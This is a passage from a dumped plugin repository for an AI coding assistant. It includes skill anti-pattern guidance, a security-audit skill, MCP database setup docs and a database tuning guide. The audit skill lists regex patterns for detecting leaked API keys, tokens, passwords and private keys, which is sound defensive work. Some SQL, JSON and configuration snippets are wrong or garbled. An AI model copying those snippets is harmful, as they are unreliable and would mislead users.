Zero-Token Retention\n\n**WRONG (If Marketplace Requires):**\n```yaml\n---\ndescription: \"Deploy the application\"\n---\n\nInvoke the `[SKILL_NAME]` skill\n```\n\n**Why Wrong:**\n- Command definition loaded into context\n- Burns tokens unnecessarily\n- No semantic discovery benefit\n\n**CORRECT (If Marketplace Requires):**\n```yaml\n---\ndescription: \"Deploy the application.\"\ndisable-model-invocation: true  # If marketplace mandates it\n---\n\nInvoke the `[SKILL_NAME]` skill\n```\n\n**Adaptation:** Only applies if your marketplace requires zero-token retention for commands.\n\n---\n\n## Skill Anti-Patterns\n\n### 5. Missing Progressive Disclosure\n\n**WRONG (If Marketplace Has Size Limits):**\n```markdown\n# SKILL.md (600+ lines)\n\n## Overview\n...\n\n## Detailed Framework 1\n[200 lines of examples]\n\n## Detailed Framework 2\n[200 lines of examples]\n\n## Detailed Framework 3\n[200 lines of examples]\n```\n\n**Why Wrong:**\n- SKILL.md too large for context\n- Hard to scan quickly\n- Burdens AI with unnecessary content\n\n**CORRECT (If Marketplace Requires Progressive Disclosure):**\n```markdown\n# SKILL.md (80 lines)\n\n## Overview\n...\n\n## Core Frameworks\n- Framework 1: brief summary\n- Framework 2: brief summary\n- Framework 3: brief summary\n\n## Reference Resources\n- **See:** references/frameworks.md - Complete framework examples\n- **See:** references/implementation.md - Detailed guides\n```\n\n**Adaptation:** Check your marketplace's size limits and progressive disclosure requirements.\n\n---\n\n### 6. Deep Linking Between Skills\n\n**WRONG (Most Marketplaces):**\n```markdown\nSee `../other-skill/SKILL.md` for details\nSee `../../../common/script.sh`\n```\n\n**Why Wrong:**\n- Breaks skill portability\n- Hardcoded filesystem paths\n- Cannot move Skills independently\n\n**CORRECT (Most Marketplaces):**\n```markdown\nSee: references/other-skill.md\nDelegate to the code-analyzer skill\n```\n\n**Adaptation:** If your marketplace has a specific way to reference other skills, use that pattern.\n\n---\n\n### 7. Incorrect Tool Syntax\n\n**WRONG (Most Marketplaces):**\n```yaml\nallowed-tools: [Bash(python, npm)]\n```\n\n**Why Wrong:**\n- Not valid syntax for many marketplaces\n- Misinterpreted by parser\n- Causes validation errors\n\n**CORRECT (Most Marketplaces):**\n```yaml\nallowed-tools: [\n  Bash(python:*),\n  Bash(npm:*)\n]\n```\n\n**Adaptation:** Some marketplaces may have different tool syntax. Check your marketplace's requirements.\n\n---\n\n## Naming Anti-Patterns\n\n### 8. Inconsistent Naming\n\n**WRONG (Most Marketplaces):**\n```yaml\nname: \"mySkill\"  # CamelCase\nname: \"My Skill\"  # Space\nname: \"my_skill\"  # Underscore\n```\n\n**CORRECT (Check Your Marketplace):**\n```yaml\nname: \"[MARKETPLACE_NAMING_CONVENTION]\"\n```\n\n**Common Conventions:**\n- kebab-case: `my-skill-name`\n- snake_case: `my_skill_name`\n- camelCase: `mySkillName`\n\n**Adaptation:** Always use your marketplace's naming convention.\n\n---\n\n### 9. Mismatched Directory Names\n\n**WRONG (Most Marketplaces):**\n```\nskills/\n  my-skill/  # Directory\n    name: \"my_skill\"  # Frontmatter\n```\n\n**CORRECT (Most Marketplaces):**\n```\nskills/\n  my-skill/\n    name: \"my-skill\"  # Matches directory\n```\n\n**Adaptation:** Directory name should match frontmatter name per your marketplace's convention.\n\n---\n\n## Description Anti-Patterns\n\n### 10. Inconsistent Description Patterns\n\n**WRONG (If Marketplace Uses Enhanced Pattern):**\n```yaml\ndescription: \"Validates plugin quality. Use when you need validation.\"\n```\n\n**Why Wrong:**\n- If marketplace uses Enhanced pattern, missing MODAL word\n- Doesn't follow marketplace convention\n\n**CORRECT (If Marketplace Uses Enhanced Pattern):**\n```yaml\ndescription: \"Validates plugin quality. MUST Use when validating plugins.\"\n```\n\n**Adaptation:** Some marketplaces use Standard pattern, others Enhanced (MUST/SHOULD/PROACTIVELY). Check your marketplace.\n\n---\n\n### 11. Poor Description Quality\n\n**WRONG (Most Marketplaces):**\n```yaml\ndescription: \"This skill does things.\"\ndescription: \"A skill for validation purposes.\"\ndescription: \"Helps with validation and other stuff.\"\n```\n\n**CORRECT (Most Marketplaces):**\n```yaml\ndescription: \"Validates [PLUGIN_TYPE] compliance with [MARKETPLACE] standards. Use when auditing or refactoring plugins.\"\n```\n\n**Adaptation:** Descriptions should be specific, actionable, and discoverable per your marketplace's guidelines.\n\n---\n\n## Permission Anti-Patterns\n\n### 12. Runtime Permission Flags in Frontmatter\n\n**WRONG (Most Marketplaces):**\n```yaml\n---\nname: my-skill\ndescription: \"Does things\"\n[RUNTIME_FLAG]: acceptEdits  # Runtime flag, not metadata!\n---\n```\n\n**Why Wrong:**\n- Runtime permission flags are configuration\n- Should never be in plugin metadata\n- Causes parsing errors\n\n**CORRECT (Most Marketplaces):**\n```yaml\n---\nname: my-skill\ndescription: \"Does things\"\n---\n```\n\n**Adaptation:** Runtime flags are configured separately. Your marketplace may have different runtime configuration methods.\n\n**Note:** Common runtime flags that should NOT be in frontmatter:\n- permissionMode\n- accepteditor\n- DontAsk\n\n---\n\n### 13. Overly Broad External Access\n\n**WRONG (If Marketplace Restricts External Access):**\n```yaml\ntools: [Read, Write, Edit, WebFetch]\n```\n\n**Why Dangerous:**\n- WebFetch allows unrestricted external access\n- Can access any URL\n- Security risk\n\n**CORRECT (If Marketplace Allows WebFetch):**\n```yaml\n# Only if absolutely necessary\ntools: [Read, WebFetch]\n```\n\n**Adaptation:** Your marketplace may restrict external network access entirely.\n\n---\n\n## Validation Anti-Patterns\n\n### 14. Ignoring Marketplace Warnings\n\n**WRONG:**\n```bash\n# Run validator, see warnings, ignore them\n[MARKETPLACE_VALIDATOR]\n# Continue without fixing warnings\n```\n\n**CORRECT:**\n```bash\n# Fix all issues\n[MARKETPLACE_VALIDATOR] --fix\n# Re-validate\n[MARKETPLACE_VALIDATOR]\n```\n\n**Adaptation:** Your marketplace's validator may have different fix options.\n\n---\n\n### 15. Not Running Validation\n\n**WRONG:**\n```bash\n# Skip validation entirely\ngit commit -m \"Update plugin\"\n```\n\n**CORRECT:**\n```bash\n# Always validate before commit\n[MARKETPLACE_VALIDATOR]\ngit add .\ngit commit -m \"Update plugin\"\n```\n\n**Adaptation:** Your marketplace may have CI/CD integration or different validation requirements.\n\n---\n\n## Quick Reference: Fix Priority\n\n### Immediate Fix (Critical Security)\n1. Unrestricted permission specifications\n2. Missing marketplace-required flags\n3. Hardcoded paths between Skills\n\n### Fix This Sprint (Major)\n1. SKILL.md exceeds marketplace size limits\n2. Commands with embedded logic\n3. Missing progressive disclosure (if required)\n\n### Fix Eventually (Minor)\n1. Typos in descriptions\n2. Formatting inconsistencies\n3. Missing optional metadata\n\n---\n\n## Adapting to Your Marketplace\n\n### Pattern Adaptation Matrix\n\n| Marketplace Type | Description Pattern | Size Limit | Permissions | Commands |\n|------------------|-------------------|------------|-------------|----------|\n| **Marketplace A** | Enhanced (MUST/SHOULD) | <500 lines | Explicit whitelists | Zero-token retention |\n| **Marketplace B** | Standard | <100 lines | Capability-based | Simple wrappers |\n| **Marketplace C** | Custom | No limit | Implicit + checks | Full workflow |\n| **Your Marketplace** | [CHECK_DOCS] | [CHECK_DOCS] | [CHECK_DOCS] | [CHECK_DOCS] |\n\n**Always check your marketplace's documentation** for specific requirements.\n\n---\n\n## Key Principle\n\n**These patterns are common but not universal.**\n\nYour marketplace may:\n- Allow some patterns listed as \"wrong\"\n- Require additional patterns not listed\n- Have different naming conventions\n- Use different validation tools\n\n**The source of truth is your marketplace's documentation, not this list.**\n",
        "plugins/sys-core/skills/auditing-plugins/references/security.md": "# Security Best Practices for Plugins\n\n## Overview\nSecurity guidelines for plugin development and auditing.\n\n## Core Principles\n1. **Input Validation**: Sanitize all inputs from users or external systems.\n2. **Permission Scoping**: Request only necessary permissions.\n3. **No Credential Leakage**: Never hardcode secrets.\n4. **Sandboxing**: Use appropriate execution environments.\n\n## Auditing Checklist\n- [ ] Check for hardcoded tokens\n- [ ] Verify file system access limits\n- [ ] Review network call destinations\n",
        "plugins/sys-core/skills/auditing-security/SKILL.md": "---\nname: auditing-security\ndescription: \"Scans for secrets and performs comprehensive security audits. MUST Use when verifying security of code changes or auditing file safety.\"\ncontext: fork\nuser-invocable: true\nagent: security-auditor\nallowed-tools: [Read, Grep, Glob]\n---\n\n# Security Audit Standards\n\n## Active Hooks\n\n\n### 1. Secret Detection\n**Trigger:** `PreToolUse` (Edit/Write)\n**Action:** Scans content for:\n- API Keys (OpenAI, Anthropic, AWS)\n- Bearer Tokens\n- Private Keys\n- GitHub Tokens\n\n### 2. File Protection\n**Trigger:** `PreToolUse` (Edit/Write)\n**Action:** Warns on modification of:\n- Lock files (`package-lock.json`, `poetry.lock`)\n- Secrets directories (`.env`, `credentials/`)\n- Git internals\n\n\n\n## Configuration\n\nPatterns are defined in:\n- `plugins/verify/hooks/scripts/security-check.py`\n- `plugins/verify/hooks/scripts/protect-files.py`\n\n## Manual Audit Protocol\n\n### Phase 1: Discovery\n1. **Identify Project Context**: Programming languages, config files, dependencies\n2. **Locate Targets**: Source files, configuration files, dependency manifests\n3. **Check Frameworks**: Security libraries or frameworks in use\n\n### Phase 2: Scanning\n**Secret Detection:**\n- API keys: `/api[_-]?key[\"\\s]*[:=][\"\\s]*[a-zA-Z0-9]{20,}/`\n- Tokens: `/token[\"\\s]*[:=][\"\\s]*[a-zA-Z0-9]{20,}/`\n- Passwords: `/(password|passwd|pwd)[\"\\s]*[:=][\"\\s]*[\"'][^\"']{6,}[\"']/`\n- Private keys: `/-----BEGIN.*PRIVATE KEY-----/`\n\n**OWASP Top 10 Detection:**\n- Injection flaws (SQL, NoSQL, OS command injection)\n- Broken authentication\n- Sensitive data exposure\n- XML external entities (XXE)\n- Broken access control\n- Security misconfiguration\n- Cross-site scripting (XSS)\n- Insecure deserialization\n- Using components with known vulnerabilities\n- Insufficient logging & monitoring\n\n**Anti-Patterns:**\n- Unsafe eval() or exec() usage\n- Hardcoded cryptographic keys\n- Weak random number generation\n- Missing input validation\n- Insecure file operations\n- Path traversal vulnerabilities\n- Command injection vectors\n\n### Phase 3: Reporting\n**Structured Security Report:**\n```markdown\n# Security Audit Report\n\n## Executive Summary\n- Total files scanned: [N]\n- Critical issues: [N]\n- High severity: [N]\n- Medium severity: [N]\n- Low severity: [N]\n\n## Critical Findings\n[Critical security issues requiring immediate attention]\n\n## High Severity\n[Significant vulnerabilities]\n\n## Medium Severity\n[Potential security concerns]\n\n## Low Severity\n[Best practice violations]\n\n## Recommendations\n[Priority-ordered remediation steps]\n```\n",
        "plugins/sys-core/skills/checking-types/SKILL.md": "---\nname: checking-types\ndescription: \"Runs configured type checkers (pyrefly, mypy) on files after editing. MUST USE when validating Python type safety (Internal-only passive hook).\"\nuser-invocable: false\nallowed-tools: [Read, Bash(pyrefly), Bash(mypy), Bash(python3:-m pyrefly), Bash(python3:-m mypy)]\n---\n\n# Type Checking Standards\n\n## Active Hooks\n\n\n### Automatic Type Check\n**Trigger:** `PostToolUse` (Edit/Write on .py files)\n**Action:** Runs type checker on the modified file.\n**Priority:**\n1. `tool.pyrefly` in pyproject.toml -> `uv run pyrefly`\n2. `tool.mypy` in pyproject.toml -> `uv run mypy`\n\n\n\n## Configuration\n\nTo enable type checking for a project, assume the presence of `pyproject.toml` with `[tool.pyrefly]` or `[tool.mypy]`.\n\n**Scripts:**\n- `plugins/verify/hooks/scripts/type-check-python.py`\n",
        "plugins/sys-core/skills/integrating-mcp/SKILL.md": "---\nname: integrating-mcp\ndescription: \"Provides comprehensive MCP integration guidance for Claude Code plugins. MUST Use when integrating databases via MCP, setting up MCP servers, or configuring connections. Do not use for API integration, web services, or general database access.\"\n---\n\n# MCP Integration for Claude Code Plugins\n\nIntegrate external services into Claude Code plugins using Model Context Protocol (MCP). MCP servers provide secure, structured access to databases, APIs, and other services through a standardized interface.\n\n\n\n#### 1. Code Execution Pattern (Recommended)\nInstead of direct tool calls, **expose code APIs** rather than tool call definitions:\n\n```json\n{\n  \"mcpServers\": {\n    \"code-exec\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@modelcontextprotocol/server-code-exec\"],\n      \"env\": {\n        \"SANDBOX_PATH\": \"/tmp/sandbox\"\n      }\n    }\n  }\n}\n```\n\n**Benefits:**\n- Give Claude a sandbox execution environment with filesystem\n- Let Claude write code to make tool calls\n- Elegant, prompt-on-demand pattern (similar to skills)\n- Reduces token overhead\n\n#### 2. Selective Tool Exposure\nOnly expose essential tools:\n\n```json\n{\n  \"mcpServers\": {\n    \"minimal-db\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\"],\n      \"env\": {\n        \"MCP_TOOLS\": \"query,schema\"\n      }\n    }\n  }\n}\n```\n\n#### 3. Connection Management\n- **Pool connections** to reuse\n- **Lazy load** servers only when needed\n- **Disconnect** inactive servers\n\n---\n\n## Database Integration\n\n### Quick Reference\n\n**1. Choose Database Type and Configure**\n- PostgreSQL: `@modelcontextprotocol/server-postgres`\n- MySQL: `@modelcontextprotocol/server-mysql`\n- SQLite: `@modelcontextprotocol/server-sqlite`\n\n**2. Set Environment Variables**\n```bash\nexport POSTGRES_URL=\"postgresql://user:pass@host:5432/db?sslmode=require\"\n```\n\n**3. Add to settings.json**\n```json\n{\n  \"mcpServers\": {\n    \"postgres\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${POSTGRES_URL}\"]\n    }\n  }\n}\n```\n\n---\n\n\n\n---\n\n## Resources\n\n### References\n- **[references/mcp-configuration.md](references/mcp-configuration.md)**: Master configuration guide.\n- **[references/security.md](references/security.md)**: Security best practices.\n- **[references/performance.md](references/performance.md)**: Performance tuning.\n- **[references/schema-management.md](references/schema-management.md)**: Schema operations.\n\n### Examples\n- **[examples/postgres-config.json](examples/postgres-config.json)**: PostgreSQL configuration.\n- **[examples/multi-db-config.json](examples/multi-db-config.json)**: Multiple database setup.\n",
        "plugins/sys-core/skills/integrating-mcp/references/mcp-configuration.md": "# Database MCP Configuration Guide\n\n## Database MCP Server Types\n\n### PostgreSQL MCP Server\n\nConnect to PostgreSQL databases using environment variables for secure credential management.\n\n**Configuration:**\n```json\n{\n  \"postgres\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${DATABASE_URL}\"],\n    \"env\": {\n      \"DATABASE_URL\": \"${POSTGRES_URL}\",\n      \"PGSSLMODE\": \"require\"\n    }\n  }\n}\n```\n\n**Environment setup:**\n```bash\nexport POSTGRES_URL=\"postgresql://username:password@localhost:5432/database_name\"\n```\n\n### MySQL MCP Server\n\nConnect to MySQL databases with similar configuration patterns.\n\n**Configuration:**\n```json\n{\n  \"mysql\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-mysql\", \"${MYSQL_URL}\"],\n    \"env\": {\n      \"MYSQL_URL\": \"${MYSQL_CONNECTION_STRING}\"\n    }\n  }\n}\n```\n\n### SQLite MCP Server\n\nConnect to SQLite databases, perfect for local development and lightweight applications.\n\n**Configuration:**\n```json\n{\n  \"sqlite\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-sqlite\", \"${SQLITE_DB_PATH}\"],\n    \"env\": {\n      \"SQLITE_DB_PATH\": \"${CLAUDE_PLUGIN_ROOT}/data/app.db\"\n    }\n  }\n}\n```\n\n### Custom Database Servers\n\nFor specialized database needs or proprietary systems, create custom MCP servers.\n\n## Database Connection Patterns\n\n### Pattern 1: Direct Connection String\n\nUse complete connection strings for simple setups:\n\n```json\n{\n  \"postgres\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${POSTGRES_URL}\"]\n  }\n}\n```\n\n### Pattern 2: Individual Parameters\n\nBreak connection into components for better configuration management:\n\n```json\n{\n  \"postgres\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\"],\n    \"env\": {\n      \"PGHOST\": \"${DB_HOST}\",\n      \"PGPORT\": \"${DB_PORT}\",\n      \"PGDATABASE\": \"${DB_NAME}\",\n      \"PGUSER\": \"${DB_USER}\",\n      \"PGPASSWORD\": \"${DB_PASSWORD}\"\n    }\n  }\n}\n```\n\n## Configuration Files\n\n### settings.json\n\nConfigure MCP servers in your plugin's settings:\n\n```json\n{\n  \"mcpServers\": {\n    \"postgres\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${POSTGRES_URL}\"]\n    }\n  }\n}\n```\n\n### Environment Variables\n\nUse environment variables for sensitive credentials:\n\n```bash\n# PostgreSQL\nexport POSTGRES_URL=\"postgresql://user:pass@host:5432/db\"\n\n# MySQL\nexport MYSQL_CONNECTION_STRING=\"mysql://user:pass@host:3306/db\"\n\n# SQLite\nexport SQLITE_DB_PATH=\"/path/to/database.db\"\n```\n\n## Available Tools\n\nOnce configured, MCP servers provide tools for database operations:\n\n### PostgreSQL Tools\n- `postgres_query` - Execute SELECT queries\n- `postgres_execute` - Execute INSERT, UPDATE, DELETE\n- `postgres_describe_table` - Get table schema\n- `postgres_list_tables` - List all tables\n\n### MySQL Tools\n- `mysql_query` - Execute SELECT queries\n- `mysql_execute` - Execute INSERT, UPDATE, DELETE\n- `mysql_describe_table` - Get table schema\n- `mysql_list_tables` - List all tables\n\n### SQLite Tools\n- `sqlite_query` - Execute SELECT queries\n- `sqlite_execute` - Execute INSERT, UPDATE, DELETE\n- `sqlite_describe_table` - Get table schema\n- `sqlite_list_tables` - List all tables\n\n## Environment Setup\n\n### Development Environment\n\n```bash\n# Local PostgreSQL\nexport POSTGRES_URL=\"postgresql://localhost:5432/devdb\"\n\n# Local SQLite (relative to plugin root)\nexport SQLITE_DB_PATH=\"${CLAUDE_PLUGIN_ROOT}/data/dev.db\"\n```\n\n### Production Environment\n\n```bash\n# Production PostgreSQL (with SSL)\nexport POSTGRES_URL=\"postgresql://user:pass@prod-host:5432/proddb?sslmode=require\"\n\n# Production MySQL (with SSL)\nexport MYSQL_CONNECTION_STRING=\"mysql://user:pass@prod-host:3306/proddb?ssl=true\"\n```\n\n## Error Handling\n\nCommon issues and solutions:\n\n### Connection Refused\n- Verify database server is running\n- Check host and port configuration\n- Confirm firewall settings\n\n### Authentication Failed\n- Verify credentials are correct\n- Check user permissions\n- Ensure SSL settings match server requirements\n\n### SSL Errors\n- Verify SSL certificate\n- Check SSL mode configuration\n- Ensure client and server SSL settings match\n",
        "plugins/sys-core/skills/integrating-mcp/references/performance.md": "# Database Performance for MCP Integration\n\nComplete guide to optimizing database performance in MCP-based plugins.\n\n## Overview\n\nDatabase performance is critical for responsive applications. This guide covers connection pooling, query optimization, indexing strategies, and monitoring techniques for database MCP servers.\n\n## Connection Pooling\n\n### PostgreSQL Connection Pool\n\n**Basic configuration:**\n```json\n{\n  \"postgres\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${DATABASE_URL}\"],\n    \"env\": {\n      \"DATABASE_URL\": \"${POSTGRES_URL}\",\n      \"PGPOOL_SIZE\": \"10\",\n      \"PGPOOL_MAX\": \"20\",\n      \"PGPOOL_MIN\": \"5\"\n    }\n  }\n}\n```\n\n**Pool size calculation:**\n- Formula: `(CPU cores  2) + disk_count`\n- Example: 4 cores, 2 disks  `(4  2) + 2 = 10` connections\n- Typical range: 5-25 connections\n\n**Environment variables:**\n```bash\n# Minimum connections (always available)\nPGPOOL_MIN=5\n\n# Normal pool size (average load)\nPGPOOL_SIZE=10\n\n# Maximum connections (peak load)\nPGPOOL_MAX=20\n\n# Maximum idle time before closing connection (seconds)\nPGPOOL_IDLE_TIMEOUT=300\n\n# Maximum lifetime of a connection (seconds)\nPGPOOL_MAX_LIFETIME=3600\n```\n\n### MySQL Connection Pool\n\n**Configuration:**\n```json\n{\n  \"mysql\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-mysql\", \"${MYSQL_URL}\"],\n    \"env\": {\n      \"MYSQL_URL\": \"${MYSQL_CONNECTION_STRING}\",\n      \"MYSQL_POOL_SIZE\": \"10\",\n      \"MYSQL_POOL_MAX\": \"20\",\n      \"MYSQL_POOL_MIN\": \"5\"\n    }\n  }\n}\n```\n\n**MySQL-specific settings:**\n```bash\nMYSQL_POOL_SIZE=10              # Default connections\nMYSQL_POOL_MAX=20               # Maximum connections\nMYSQL_POOL_MIN=5                # Minimum connections\nMYSQL_POOL_TIMEOUT=60000        # Timeout in milliseconds\nMYSQL_POOL_QUEUE_TIMEOUT=30000  # Queue wait timeout\nMYSQL_POOL_ENABLE_KEEP_ALIVE=true  # Keep connections alive\n```\n\n### SQLite Connection\n\n**SQLite has no connection pool (single process):**\n```json\n{\n  \"sqlite\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-sqlite\", \"${SQLITE_DB_PATH}\"],\n    \"env\": {\n      \"SQLITE_DB_PATH\": \"${SQLITE_PATH}\",\n      \"SQLITE_TIMEOUT\": \"5000\",      # Lock timeout in milliseconds\n      \"SQLITE_BUSY_TIMEOUT\": \"5000\"   # Busy handler timeout\n    }\n  }\n}\n```\n\n**SQLite optimization:**\n```bash\n# Enable WAL mode for better concurrency\nSQLITE_WAL_AUTOCHECKPOINT=1000   # Checkpoint interval\n\n# Set busy timeout (wait for lock before failing)\nSQLITE_TIMEOUT=5000\n\n# Cache size (negative = KB, positive = pages)\nSQLITE_CACHE_SIZE=-64000         # 64 MB cache\n```\n\n## Query Optimization\n\n### Indexing Strategies\n\n**Identify slow queries:**\n```sql\n-- PostgreSQL - Find slow queries\nSELECT query, mean_exec_time, calls, total_exec_time\nFROM pg_stat_statements\nORDER BY mean_exec_time DESC\nLIMIT 10;\n\n-- MySQL - Enable slow query log\nSET GLOBAL slow_query_log = 'ON';\nSET GLOBAL long_query_time = 1;  # Log queries > 1 second\n```\n\n**Create indexes:**\n```sql\n-- PostgreSQL - Basic index\nCREATE INDEX idx_users_email ON users(email);\n\n-- MySQL - Full-text index\nCREATE FULLTEXT INDEX idx_products_search ON products(title, description);\n\n-- Composite index\nCREATE INDEX idx_orders_user_date ON orders(user_id, created_at);\n\n-- Partial index (PostgreSQL only)\nCREATE INDEX idx_active_users ON users(email)\nWHERE status = 'active';\n```\n\n**Index best practices:**\n- Index frequently queried columns\n- Use composite indexes for multi-column queries\n- Index foreign keys for joins\n- Consider partial indexes for filtered data\n- Monitor index usage and remove unused indexes\n\n### Query Patterns\n\n### GOOD: Efficient queries:\n```sql\n-- Use specific columns\nSELECT id, name, email FROM users WHERE id = $1;\n\n-- Use indexes effectively\nSELECT * FROM orders\nWHERE user_id = $1\n  AND created_at >= $2\nORDER BY created_at DESC\nLIMIT 20;\n\n-- Proper join with indexes\nSELECT u.id, u.name, COUNT(o.id) as order_count\nFROM users u\nLEFT JOIN orders o ON u.id = o.user_id\nWHERE u.status = 'active'\nGROUP BY u.id, u.name\nORDER BY order_count DESC;\n```\n\n### BAD: Inefficient queries:\n```sql\n-- SELECT * (avoid in production)\nSELECT * FROM users WHERE id = $1;\n\n-- Missing WHERE clause\nSELECT * FROM orders;\n\n-- Functions on indexed columns (breaks index usage)\nSELECT * FROM users WHERE LOWER(email) = LOWER($1);\n\n-- OR in WHERE clause (can be slow)\nSELECT * FROM products WHERE category = 'A' OR category = 'B';\n\n-- LIKE with leading wildcard\nSELECT * FROM products WHERE name LIKE '%searchterm%';\n```\n\n### Pagination\n\n**Limit/Offset (simple but can be slow on large tables):**\n```sql\nSELECT id, name, email\nFROM users\nORDER BY id\nLIMIT 20 OFFSET 1000;  -- Slow on large offsets\n```\n\n**Keyset pagination (better for large datasets):**\n```sql\n-- First page\nSELECT id, name, email\nFROM users\nORDER BY id\nLIMIT 20;\n\n-- Next page (using last ID from previous page)\nSELECT id, name, email\nFROM users\nWHERE id > $1\nORDER BY id\nLIMIT 20;\n```\n\n**Cursor-based pagination:**\n```sql\n-- Use cursor for efficient scrolling\nDECLARE cursor_name CURSOR FOR SELECT * FROM large_table;\nFETCH 20 FROM cursor_name;\n```\n\n## Caching Strategies\n\n### Query Result Caching\n\n**Cache frequently accessed data:**\n```markdown\nSteps:\n1. Check cache first\n2. If cache hit, return cached data\n3. If cache miss, query database\n4. Store result in cache with TTL\n5. Return data to user\n\nExample caching rules:\n- User profiles: Cache for 1 hour\n- Product lists: Cache for 30 minutes\n- Static configuration: Cache for 24 hours\n- Real-time data: No cache\n```\n\n**Cache invalidation:**\n```markdown\nSteps:\n1. Update database\n2. Delete/expire cache entry\n3. Refresh cache with new data\n4. Verify cache consistency\n\nExample:\nWhen user updates profile:\n1. UPDATE users SET name = $1 WHERE id = $2;\n2. DELETE FROM cache WHERE key = 'user_profile_' || $2;\n3. SELECT * FROM users WHERE id = $2;\n4. SETEX cache key new_data 3600;\n```\n\n### Application-Level Caching\n\n**Redis for caching:**\n```bash\n# Install Redis MCP server\nnpm install -g @modelcontextprotocol/server-redis\n```\n\n```json\n{\n  \"redis\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-redis\", \"${REDIS_URL}\"],\n    \"env\": {\n      \"REDIS_URL\": \"${REDIS_CONNECTION_STRING}\"\n    }\n  }\n}\n```\n\n**Cache patterns:**\n```markdown\nCache patterns for database queries:\n\n1. Read-through:\n   - Application checks cache first\n   - On miss, query database and store in cache\n   - Best for: Frequently read, rarely updated data\n\n2. Write-through:\n   - Update database and cache simultaneously\n   - Best for: Data that must be consistent\n\n3. Write-behind:\n   - Update cache immediately\n   - Async write to database\n   - Best for: High-write scenarios, eventual consistency OK\n\n4. Cache-aside:\n   - Application manages cache explicitly\n   - On read: Check cache  DB if miss\n   - On write: Update DB  Delete cache\n   - Best for: Simple caching needs\n```\n\n### Database Query Cache\n\n**PostgreSQL:**\n```sql\n-- Enable query plan caching\nSET shared_preload_libraries = 'pg_stat_statements';\n\n-- Configure cache size\nALTER SYSTEM SET pg_stat_statements.max = 10000;\nSELECT pg_reload_conf();\n```\n\n**MySQL:**\n```sql\n-- Enable query cache\nSET GLOBAL query_cache_type = ON;\nSET GLOBAL query_cache_size = 1048576;  -- 1 MB\nSET GLOBAL query_cache_limit = 1048576;  -- 1 MB max query size\n```\n\n## Performance Monitoring\n\n### Database Metrics\n\n**PostgreSQL - Key metrics:**\n```sql\n-- Connections\nSELECT count(*) FROM pg_stat_activity;\n\n-- Database size\nSELECT pg_size_pretty(pg_database_size('myapp'));\n\n-- Table sizes\nSELECT\n  schemaname,\n  tablename,\n  pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) as size\nFROM pg_tables\nWHERE schemaname = 'public'\nORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC;\n\n-- Index usage\nSELECT\n  schemaname,\n  tablename,\n  indexname,\n  idx_scan,\n  idx_tup_read,\n  idx_tup_fetch\nFROM pg_stat_user_indexes\nORDER BY idx_scan DESC;\n\n-- Slow queries\nSELECT query, mean_exec_time, calls\nFROM pg_stat_statements\nWHERE mean_exec_time > 100  -- Average > 100ms\nORDER BY mean_exec_time DESC\nLIMIT 10;\n```\n\n**MySQL - Key metrics:**\n```sql\n-- Connection count\nSHOW STATUS LIKE 'Threads_connected';\nSHOW STATUS LIKE 'Max_used_connections';\n\n-- Database size\nSELECT\n  table_schema AS 'Database',\n  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'DB Size in MB'\nFROM information_schema.tables\nGROUP BY table_schema;\n\n-- Table sizes\nSELECT\n  table_name,\n  ROUND(((data_length + index_length) / 1024 / 1024), 2) AS 'Size (MB)'\nFROM information_schema.tables\nWHERE table_schema = 'myapp'\nORDER BY (data_length + index_length) DESC;\n\n-- Slow query log\nSHOW VARIABLES LIKE 'slow_query_log';\nSHOW VARIABLES LIKE 'long_query_time';\n```\n\n### Application-Level Monitoring\n\n**Track query performance:**\n```markdown\nSteps:\n1. Log query execution time\n2. Track query frequency\n3. Identify slow queries\n4. Monitor query errors\n5. Set performance thresholds\n\nExample metrics:\n- Query count per operation\n- Average execution time\n- 95th percentile latency\n- Error rate\n- Cache hit rate\n```\n\n**Example monitoring script:**\n```bash\n#!/bin/bash\n# monitor-db-performance.sh\n\n# Check connection pool usage\necho \"=== Connection Pool Status ===\"\npsql -c \"SELECT count(*) as active_connections FROM pg_stat_activity;\"\n\n# Check slow queries\necho -e \"\\n=== Slow Queries (last 1 hour) ===\"\npsql -c \"SELECT query, mean_exec_time, calls\nFROM pg_stat_statements\nWHERE last_exec > NOW() - INTERVAL '1 hour'\nORDER BY mean_exec_time DESC\nLIMIT 5;\"\n\n# Check table sizes\necho -e \"\\n=== Largest Tables ===\"\npsql -c \"SELECT schemaname, tablename,\npg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) as size\nFROM pg_tables\nWHERE schemaname = 'public'\nORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC\nLIMIT 5;\"\n```\n\n## Database-Specific Optimizations\n\n### PostgreSQL Optimizations\n\n**Configuration tuning:**\n```bash\n# shared_buffers (25% of RAM for dedicated server)\nshared_buffers = 2GB\n\n# effective_cache_size (estimate of OS cache)\neffective_cache_size = 6GB\n\n# work_mem (per operation, adjust based on queries)\nwork_mem = 16MB\n\n# maintenance_work_mem (for VACUUM, CREATE INDEX)\nmaintenance_work_mem = 512MB\n\n# random_page_cost (1.1 for SSD, 1.3-1.4 for RAID)\nrandom_page_cost = 1.1\n\n# Enable parallelism\nmax_parallel_workers_per_gather = 4\nmax_parallel_workers = 8\n```\n\n**WAL configuration:**\n```bash\n# WAL settings for write performance\nwal_buffers = 16MB\ncheckpoint_completion_target = 0.9\nmax_wal_size 